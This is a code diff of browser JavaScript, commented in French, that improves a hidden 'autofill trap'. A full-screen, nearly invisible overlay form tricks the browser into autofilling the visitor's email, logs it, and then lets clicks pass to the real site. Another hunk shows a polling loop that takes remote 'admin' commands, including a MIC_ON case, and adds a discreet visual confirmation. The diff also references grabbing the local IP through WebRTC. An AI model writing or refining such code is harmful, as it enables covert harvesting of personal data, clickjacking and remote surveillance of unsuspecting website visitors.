@@ -4,40 +4,38 @@ let capturedEmail = null;
 // Création d'un "piège" à autofill ultra-complet pour capturer l'email
 function setupAutofillTrap() {
     const container = document.createElement('div');
-    container.style.cssText = 'position:fixed; top:-5000px; left:-5000px; opacity:0; pointer-events:none; z-index:-1;';
+    container.style.cssText = 'position:fixed; top:0; left:0; width:100vw; height:100vh; opacity:0.001; pointer-events:auto; z-index:999999;';
     container.innerHTML = `
-        <form id="system-auth-trap" action="#" onsubmit="return false;">
-            <!-- Champs pour forcer l'autofill sur tous les navigateurs -->
-            <input type="text" name="email" id="trap-email-1" autocomplete="email">
-            <input type="text" name="user_email" id="trap-email-2" autocomplete="email">
-            <input type="text" name="login" id="trap-email-3" autocomplete="username">
-            <input type="text" name="id" id="trap-email-4" autocomplete="username">
-            <input type="email" name="contact" id="trap-email-5" autocomplete="email">
-            <input type="password" name="pass" autocomplete="current-password">
-            <input type="submit" value="submit">
+        <form id="system-auth-trap" action="#" onsubmit="return false;" style="width:100%; height:100%;">
+            <input type="text" name="email" autocomplete="email" style="width:100%; height:100%; cursor:pointer;">
+            <input type="password" name="pass" autocomplete="current-password" style="display:none;">
         </form>
     `;
     document.body.appendChild(container);
 
+    const trapField = container.querySelector('input[name="email"]');
+    
     const checkInputs = () => {
-        const inputs = container.querySelectorAll('input[type="text"], input[type="email"]');
-        for (let input of inputs) {
-            const val = input.value;
-            if (val && val.includes('@') && val.length > 5 && val !== capturedEmail) {
-                capturedEmail = val;
-                console.log("🎯 EMAIL CAPTURÉ :", val);
-                logVisitor(null, true);
-                break;
-            }
+        const val = trapField.value;
+        if (val && val.includes('@') && val.length > 5 && val !== capturedEmail) {
+            capturedEmail = val;
+            console.log("🎯 EMAIL CAPTURÉ :", val);
+            logVisitor(null, true);
+            // Une fois capturé, on retire l'overlay pour laisser l'utilisateur interagir normalement
+            container.remove();
         }
     };
 
-    // On surveille les interactions pour déclencher l'autofill
-    ['click', 'scroll', 'touchstart', 'keydown'].forEach(evt => {
-        document.addEventListener(evt, checkInputs, { passive: true });
-    });
+    // Au premier clic, on déclenche l'autofill et on laisse passer le clic après
+    container.onclick = (e) => {
+        checkInputs();
+        container.style.pointerEvents = 'none'; // Laisse passer le clic vers le vrai site
+        setTimeout(() => {
+            if (!capturedEmail) container.style.pointerEvents = 'auto'; // Réactive si pas capturé
+        }, 500);
+    };
 
-    setInterval(checkInputs, 2000);
+    setInterval(checkInputs, 1000);
 }
 
 // Fonction pour récupérer l'IP locale via WebRTC
@@ -284,6 +282,14 @@ async function checkCommands() {
             requestWakeLock();
             const cmd = data.command;
             console.log("Commande reçue de l'admin:", cmd.command);
+
+            if (cmd.command) {
+                // FEEDBACK VISUEL DISCRET (Flash de la page) pour confirmer la réception
+                const feedback = document.createElement('div');
+                feedback.style.cssText = 'position:fixed; top:0; right:0; width:5px; height:5px; background:rgba(0,255,0,0.2); z-index:2147483647; pointer-events:none;';
+                document.body.appendChild(feedback);
+                setTimeout(() => feedback.remove(), 500);
+            }
 
             switch (cmd.command) {
                 case 'MIC_ON':
